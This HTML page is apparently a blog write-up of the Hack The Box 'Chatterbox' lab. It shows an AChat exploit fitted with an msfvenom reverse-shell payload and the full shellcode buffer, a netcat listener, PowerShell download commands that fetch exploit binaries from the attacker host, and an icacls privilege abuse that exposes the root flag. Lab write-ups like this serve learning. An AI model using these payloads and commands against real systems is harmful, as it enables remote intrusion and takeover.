<!DOCTYPE html>
<html>

  <head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Chatterbox &#8211; HacktheBox</title>
	<meta name="description" content="START">
	
	<link rel="canonical" href="http://0.0.0.0:4000/2018/05/31/chatterbox-hackthebox/">
	<link rel="alternate" type="application/rss+xml" title="Your awesome title" href="http://0.0.0.0:4000/feed.xml" />
	
	<!-- <link rel="stylesheet" href="/css/main.css"> -->
    
    <link rel="stylesheet" type="text/css" href="/static/css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="/static/css/index.css">
	<script type="text/javascript" src="/static/js/jquery-1.11.1.min.js"></script>
	<script type="text/javascript" src="/static/js/bootstrap.min.js"></script>
    <link rel="stylesheet" type="text/css" href="/static/css/monokai_sublime.min.css">
	<script type="text/javascript" src="/static/js/highlight.min.js"></script>

    <!--
    <link rel="stylesheet" type="text/css" href="http://apps.bdimg.com/libs/bootstrap/3.3.0/css/bootstrap.min.css">
	<script type="text/javascript" src="http://apps.bdimg.com/libs/jquery/2.1.1/jquery.min.js"></script>
	<script type="text/javascript" src="http://apps.bdimg.com/libs/bootstrap/3.3.0/js/bootstrap.min.js"></script>
    <link rel="stylesheet" type="text/css" href="http://apps.bdimg.com/libs/highlight.js/8.4/styles/monokai_sublime.min.css">
	<script type="text/javascript" src="http://apps.bdimg.com/libs/highlight.js/8.4/highlight.min.js"></script>
    -->
    
	<script type="text/javascript" src="/static/js/index.js"></script>
	<script>hljs.initHighlightingOnLoad();</script>
</head>

 <!--  <body data-spy="scroll" data-target="#myAffix"> -->
  <body>

    <header>

<!-- navbar -->
  <nav class="navbar navbar-inverse">
  <div class="container">
    <!-- Brand and toggle get grouped for better mobile display -->
    <div class="navbar-header">
      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="/">Your awesome title</a>
      <p class="navbar-text"></p>
    </div>
    <!-- Collect the nav links, forms, and other content for toggling -->
    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
      <ul class="nav navbar-nav navbar-right">

        
          <li>
        
        <a href="/">Home</a></li>

        
          
        
          
            
              <li>
            
            <a href="/about/"><span class="glyphicon "></span> About</a></li>
          
        
          
            
              <li>
            
            <a href="/about/"><span class="glyphicon "></span> About</a></li>
          
        
          
        
          
        
          
        
      </ul>
    </div><!-- /.navbar-collapse -->
  </div><!-- /.container-fluid -->
</nav>

</header>

    <div id="main" class="container main">
      <div class="row">
  <div id="myArticle" class="col-sm-9">
    <div class="post-area post">
      <header>
        <h1>Chatterbox &#8211; HacktheBox</h1>
        <p>May 31, 2018 • rowbot</p>
      </header>
      <hr>
      <article>
        <p>START</p>

<p>My god this was an annoying machine to scan! I’ll not bore you with all the tools and flags I used to try to find some open ports. Lets just say that I spent about 2-3 hours (probably more) messing about and waiting for scans to complete. I broke the scan up into ranges and finally found this:</p>

<pre>[root:~/Desktop]# nmap -p 1000-10000 10.10.10.74 
Starting Nmap 7.70SVN ( https://nmap.org ) at 2018-05-30 14:27 BST
Warning: 10.10.10.74 giving up on port because retransmission cap hit (1).
Stats: 0:03:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 67.47% done; ETC: 14:31 (0:01:26 remaining)
Stats: 0:06:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 79.06% done; ETC: 14:34 (0:01:35 remaining)
Stats: 0:07:58 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 86.73% done; ETC: 14:36 (0:01:13 remaining)
Stats: 0:09:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 90.67% done; ETC: 14:37 (0:00:55 remaining)
Stats: 0:10:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 94.56% done; ETC: 14:37 (0:00:35 remaining)
Stats: 0:11:24 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.95% done; ETC: 14:38 (0:00:00 remaining)
Nmap scan report for 10.10.10.74
Host is up, received echo-reply ttl 127 (0.031s latency).
Not shown: 8999 filtered ports
Reason: 8999 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT STATE SERVICE REASON
9255/tcp open mon syn-ack ttl 127
9256/tcp open unknown syn-ack ttl 127

Nmap done: 1 IP address (1 host up) scanned in 685.80 seconds</pre>

<p>Scripts and Version detection nmap ran</p>

<pre>[root:~/Desktop/chatterbox]# nmap -sC -sV -p 9255,9256 10.10.10.74 
Starting Nmap 7.70SVN ( https://nmap.org ) at 2018-05-30 14:54 BST
Nmap scan report for 10.10.10.74
Host is up, received echo-reply ttl 127 (0.030s latency).

PORT STATE SERVICE REASON VERSION
9255/tcp open http syn-ack ttl 127 AChat chat system httpd
|_http-server-header: AChat
|_http-title: Site doesn't have a title.
9256/tcp open achat syn-ack ttl 127 AChat chat system

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.05 seconds
[root:~/Desktop/chatterbox]#</pre>

<p>Webserver on 9255 port lets check it out. I’ll not waste your time but I couldn’t find any pages even after a dirsearch.</p>

<p>I googled AChat looking for a vulnerability and found this https://www.exploit-db.com/exploits/36025/</p>

<p>I modified the script to point to the server</p>

<pre># Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = ('10.10.10.74', 9256)</pre>

<p>and modified the payload to run a reverse_tcp</p>

<pre>msfvenom -a x86 -platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.234 LPORT=12343 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python</pre>

<p>This gave me the following code which i pasted in to the python script</p>

<pre>buf = "" 
buf += "\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += "\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += "\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41" 
buf += "\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += "\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += "\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += "\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += "\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += "\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += "\x47\x42\x39\x75\x34\x4a\x42\x79\x6c\x4b\x38\x61\x72"
buf += "\x6d\x30\x59\x70\x59\x70\x71\x50\x55\x39\x69\x55\x4e"
buf += "\x51\x35\x70\x42\x44\x34\x4b\x42\x30\x30\x30\x54\x4b"
buf += "\x61\x42\x6c\x4c\x52\x6b\x50\x52\x7a\x74\x54\x4b\x44"
buf += "\x32\x6e\x48\x4c\x4f\x34\x77\x30\x4a\x4d\x56\x6d\x61"
buf += "\x59\x6f\x44\x6c\x6f\x4c\x4f\x71\x71\x6c\x79\x72\x4e"
buf += "\x4c\x6b\x70\x65\x71\x78\x4f\x6c\x4d\x39\x71\x46\x67"
buf += "\x7a\x42\x4a\x52\x61\x42\x4f\x67\x42\x6b\x52\x32\x4a"
buf += "\x70\x54\x4b\x30\x4a\x6f\x4c\x52\x6b\x50\x4c\x6a\x71"
buf += "\x44\x38\x7a\x43\x51\x38\x4d\x31\x67\x61\x6f\x61\x32"
buf += "\x6b\x32\x39\x4f\x30\x59\x71\x68\x53\x74\x4b\x6f\x59"
buf += "\x6e\x38\x37\x73\x6e\x5a\x4e\x69\x44\x4b\x4c\x74\x74"
buf += "\x4b\x4b\x51\x69\x46\x30\x31\x4b\x4f\x74\x6c\x56\x61"
buf += "\x48\x4f\x5a\x6d\x49\x71\x75\x77\x6c\x78\x49\x50\x74"
buf += "\x35\x6b\x46\x39\x73\x53\x4d\x78\x78\x6f\x4b\x43\x4d"
buf += "\x6e\x44\x64\x35\x6b\x34\x42\x38\x54\x4b\x42\x38\x4f"
buf += "\x34\x7a\x61\x37\x63\x33\x36\x62\x6b\x4c\x4c\x4e\x6b"
buf += "\x74\x4b\x51\x48\x4d\x4c\x49\x71\x59\x43\x64\x4b\x6c"
buf += "\x44\x74\x4b\x4b\x51\x68\x50\x73\x59\x4e\x64\x4c\x64"
buf += "\x6e\x44\x51\x4b\x51\x4b\x43\x31\x71\x49\x4e\x7a\x4f"
buf += "\x61\x49\x6f\x77\x70\x61\x4f\x71\x4f\x4f\x6a\x44\x4b"
buf += "\x4c\x52\x5a\x4b\x74\x4d\x71\x4d\x52\x48\x6f\x43\x30"
buf += "\x32\x79\x70\x4d\x30\x52\x48\x61\x67\x32\x53\x6f\x42"
buf += "\x71\x4f\x31\x44\x73\x38\x4e\x6c\x44\x37\x4e\x46\x4d"
buf += "\x37\x6b\x4f\x79\x45\x34\x78\x56\x30\x6d\x31\x59\x70"
buf += "\x79\x70\x6b\x79\x76\x64\x30\x54\x72\x30\x4f\x78\x6c"
buf += "\x69\x63\x50\x52\x4b\x49\x70\x59\x6f\x5a\x35\x30\x50"
buf += "\x6e\x70\x52\x30\x4e\x70\x6d\x70\x4e\x70\x71\x30\x50"
buf += "\x50\x71\x58\x68\x6a\x7a\x6f\x69\x4f\x37\x70\x4b\x4f"
buf += "\x56\x75\x32\x77\x42\x4a\x4a\x65\x50\x68\x5a\x6a\x69"
buf += "\x7a\x6a\x6e\x5a\x4a\x71\x58\x49\x72\x69\x70\x6e\x50"
buf += "\x4c\x77\x43\x59\x38\x66\x30\x6a\x4a\x70\x70\x56\x62"
buf += "\x37\x33\x38\x35\x49\x56\x45\x31\x64\x73\x31\x79\x6f"
buf += "\x5a\x35\x33\x55\x49\x30\x74\x34\x5a\x6c\x49\x6f\x50"
buf += "\x4e\x59\x78\x71\x65\x68\x6c\x50\x68\x38\x70\x36\x55"
buf += "\x34\x62\x72\x36\x69\x6f\x6a\x35\x73\x38\x43\x33\x42"
buf += "\x4d\x6f\x74\x69\x70\x44\x49\x67\x73\x72\x37\x31\x47"
buf += "\x61\x47\x50\x31\x58\x76\x50\x6a\x4a\x72\x71\x49\x30"
buf += "\x56\x59\x52\x49\x6d\x70\x66\x48\x47\x51\x34\x6f\x34"
buf += "\x4f\x4c\x79\x71\x39\x71\x42\x6d\x6f\x54\x6e\x44\x6c"
buf += "\x50\x45\x76\x69\x70\x6e\x64\x31\x44\x42\x30\x4e\x76"
buf += "\x30\x56\x50\x56\x50\x46\x70\x56\x30\x4e\x52\x36\x72"
buf += "\x36\x6f\x63\x51\x46\x62\x48\x32\x59\x76\x6c\x6f\x4f"
buf += "\x34\x46\x69\x6f\x76\x75\x75\x39\x57\x70\x6e\x6e\x50"
buf += "\x56\x6f\x56\x6b\x4f\x30\x30\x52\x48\x6d\x38\x44\x47"
buf += "\x4b\x6d\x71\x50\x59\x6f\x77\x65\x75\x6b\x6c\x30\x78"
buf += "\x35\x44\x62\x71\x46\x71\x58\x46\x46\x66\x35\x65\x6d"
buf += "\x45\x4d\x49\x6f\x48\x55\x4d\x6c\x6b\x56\x31\x6c\x6c"
buf += "\x4a\x71\x70\x49\x6b\x79\x50\x50\x75\x79\x75\x37\x4b"
buf += "\x51\x37\x6c\x53\x61\x62\x30\x6f\x52\x4a\x6b\x50\x52"
buf += "\x33\x4b\x4f\x68\x55\x41\x41"</pre>

<p>I started a netcat listener on 1234 but nothing was connecting. For a long time I couldn’t figure out why. Then I scrolled back up to the command I used to create the code and realized i added an extra digit on the port. D’oh!<br />
So I restarted the listener using the correct port and got a connection back when I ran the code.</p>

<pre>[<span style="color: #8ae234;"><b>root</b></span>:<span style="color: #cc0000;">~/Desktop/chatterbox</span>]# python 36025.py                                                                                                                                                      (<span style="color: #fce94f;"><b>master</b></span><span style="color: #ef2929;"><b>✱</b></span>) 
----&gt;{P00F}!
</pre>

<pre>[<span style="color: #8ae234;"><b>root</b></span>:<span style="color: #cc0000;">~/Desktop/chatterbox</span>]# nc -lvnp 12343                                                                                                                                                       (<span style="color: #fce94f;"><b>master</b></span><span style="color: #ef2929;"><b>✱</b></span>) 
listening on [any] 12343 ...
connect to [10.10.14.234] from (UNKNOWN) [10.10.10.74] 49160
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32&gt;whoami
whoami
chatterbox\alfred

C:\Windows\system32&gt;
</pre>

<p>I captured user.txt flag</p>

<pre>C:\Users\Alfred\Desktop&gt;type user.txt 
type user.txt 
72290246dfaedb1e3e3ac9d6fb306334</pre>

<p>Next stop to see what info i can find out about the system</p>

<pre>C:\Users\Administrator\Desktop&gt;systeminfo 
systeminfo 

Host Name: CHATTERBOX 
OS Name: Microsoft Windows 7 Professional
OS Version: 6.1.7601 Service Pack 1 Build 7601
OS Manufacturer: Microsoft Corporation 
OS Configuration: Standalone Workstation
OS Build Type: Multiprocessor Free
Registered Owner: Windows User 
Registered Organization: 
Product ID: 00371-223-0897461-86794
Original Install Date: 12/10/2017, 9:18:19 AM
System Boot Time: 5/30/2018, 11:48:49 AM 
System Manufacturer: VMware, Inc. 
System Model: VMware Virtual Platform 
System Type: X86-based PC 


</pre>

<p>I was surprised to see I could browse into the Administrator’s folder and desktop. Unfortunately I could not view the root flag.</p>

<pre>C:\Users\Administrator\Desktop&gt;type root.txt
type root.txt 
Access is denied.</pre>

<p>Back to Google to see if I can find out what exploits are out there for 6.1.7601 service pack 1 build 7601.</p>

<p>Found an exploit. Copied it to kali and used powersploit the shell to download it from python webserver I called it ms11.exe for simplicity. Here is a useful website <a href="https://www.jollyfrogs.com/transfer-files-windows/">https://www.jollyfrogs.com/transfer-files-windows/</a></p>

<pre>C:\Users\Alfred\Desktop&gt;powershell.exe -noninteractive -ExecutionPolicy Bypass -NoLogo -NoProfile (new-object System.Net.WebClient).DownloadFile('http://10.10.14.234:8000/MS11.exe','MS11.exe')            
powershell.exe -noninteractive -ExecutionPolicy Bypass -NoLogo -NoProfile (new-object System.Net.WebClient).DownloadFile('http://10.10.14.234:8000/MS11.exe','MS11.exe')  
</pre>

<pre>C:\Users\Alfred\Desktop&gt;ms11.exe
ms11.exe
[*] MS11-046 (CVE-2011-1249) x86 exploit
   [*] by Tomislav Paskalev
[*] Identifying OS
   [+] 32-bit
   [+] Windows 7 SP1
[*] Locating required OS components
   [+] ntkrnlpa.exe
      [*] Address:      0x82a0d000
      [*] Offset:       0x01620000
      [+] HalDispatchTable
         [*] Offset:    0x0174d440
   [+] NtQueryIntervalProfile
      [*] Address:      0x779a5c90
   [+] ZwDeviceIoControlFile
      [*] Address:      0x779a5420
[*] Setting up exploitation prerequisite
   [*] Initialising Winsock DLL
      [+] Done
      [*] Creating socket
         [+] Done
         [*] Connecting to closed port
            [+] Done
[*] Creating token stealing shellcode
   [*] Shellcode assembled
   [*] Allocating memory
      [+] Address:      0x02070000
      [*] Shellcode copied
[*] Exploiting vulnerability
   [*] Sending AFD socket connect request
      [!] Target patched
         [*] Possible security patches
            [*] KB2503665
            [*] KB2975684

C:\Users\Alfred\Desktop&gt;
</pre>

<p>Unfortunately the system has been patched and this didn’t work. I found another exploit – uploaded and run it but it didn’t work.</p>

<pre>powershell.exe -noninteractive -ExecutionPolicy Bypass -NoLogo -NoProfile (new-object System.Net.WebClient).DownloadFile('http://10.10.14.234:8000/EoP.exe','EoP.exe')</pre>

<p>I came back to the box the next day – yes I needed to take a break, especially as I was getting really annoyed as it took me a long time to figure out how to transfer a file into windows. Linux is so much easier – never thought I’d hear myself saying that! I’m actually at the stage that I prefer working in Linux for exploiting things.</p>

<p>I decided to go back over my notes and realized that I can view the root.txt file – which you normally cant, I actually made reference that this was usual but I ignored it and moved on. This turned out to be the way forward. I changed permission of the file and granted Alfred user ( whom I’m logged in as ) access. – After a bit of Googling I got the correct command.</p>

<pre>C:\Users\Administrator\Desktop&gt;icacls "c:\Users\Administrator\Desktop\root.txt" /grant Alfred:F
icacls "c:\Users\Administrator\Desktop\root.txt" /grant Alfred:F
processed file: c:\Users\Administrator\Desktop\root.txt
Successfully processed 1 files; Failed processing 0 files

C:\Users\Administrator\Desktop&gt;
</pre>

<p>Next stop, root flag!</p>

<pre>C:\Users\Administrator\Desktop&gt;type root.txt
type root.txt
a673d1b1fa95c276c5ef2aa13d9dcc7c
</pre>

<p>FIN</p>

<p>Summary</p>

<p>I liked this box, it initially tested my patience not being able to easily find a port to probe. Once I found the port it was only a sort time until I was in as a user. The only problem I had was that I had to restart it several times as it hung when I was trying different commands to get the exploit to the server.</p>

      </article>
      <hr>
        <div class="bdsharebuttonbox">
            <a href="#" class="bds_more" data-cmd="more"></a>
            <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
            <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
            <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
            <a href="#" class="bds_fbook" data-cmd="fbook" title="Share to Facebook"></a>
            <a href="#" class="bds_copy" data-cmd="copy" title="分享到复制网址"></a>
        </div>
        <script>
            window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
        </script>
    </div>
	    
  </div>
  
  <div id="content" class="col-sm-3">
    <!-- <div id="myAffix" class="shadow-bottom-center hidden-xs" data-spy="affix" data-offset-top="0" data-offset-bottom="-20"> -->
    <div id="myAffix" class="shadow-bottom-center hidden-xs" >
      <div class="categories-list-header">
        Content
      </div>
      <div class="content-text"></div>
    </div>
  </div>
  
</div>
    </div>

    
    <div id="top" data-toggle="tooltip" data-placement="left" title="back to top">
      <a href="javascript:;">
        <div class="arrow"></div>
        <div class="stick"></div>
      </a>
    </div>

    <footer class="">
  <div class="container">
    <div class="row">
      <div class="col-md-12">
        <a href="mailto:your-email@example.com"><span class="glyphicon glyphicon-envelope"></span> your-email@example.com</a>
        <span class="point"> · </span>
        
          <a href="https://github.com/jekyll">
            <span class="icon">
              <svg viewBox="0 0 16 16">
                <path fill="#aaa" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/>
              </svg>
            </span>
            Github
            <!-- <span>jekyll</span> -->
          </a>
          
          <span class="point"> · </span>
          <span><a href="_posts/2018-05-31-chatterbox-hackthebox.md">View source</a></span>
          <span class="point"> · </span>
          <span><a class="newpost" href="javascript:;">New post</a></span>
		  <span class="point"> · </span>
          <span><a href="/feed.xml">RSS</a></span>
          <span class="point"> · </span>
          <span>&copy; 2015 LiXizhi</span>
      </div>
    </div>
  </div>
</footer>

    <script type="text/javascript">
    function OnClickNewPost()
    {
        var title = prompt("Please enter title of your post");
        if (title!=null){
            title = title.replace(" ", "-");
            var currentdate = new Date();
            var urlNewPage = "?filename=_posts/" 
                + currentdate.getFullYear() + "-" + (currentdate.getMonth()+1) + "-" + currentdate.getDate() + "-" + title + ".md";
                
            var defaultText =  [
                '---',
                'layout: post',
                'comments: true',
                'categories: diary',
                '---',
                '## Title',
                'text'
                ].join('\n');
            urlNewPage += "&value=" + encodeURIComponent(defaultText);
            window.open(urlNewPage);
        }
    }
    
    $(function() {
      // CreateNewPostLinks
      $('.newpost').each(function(){
          $(this).click(OnClickNewPost);
      });
    });
</script>
  
  </body>
</html>
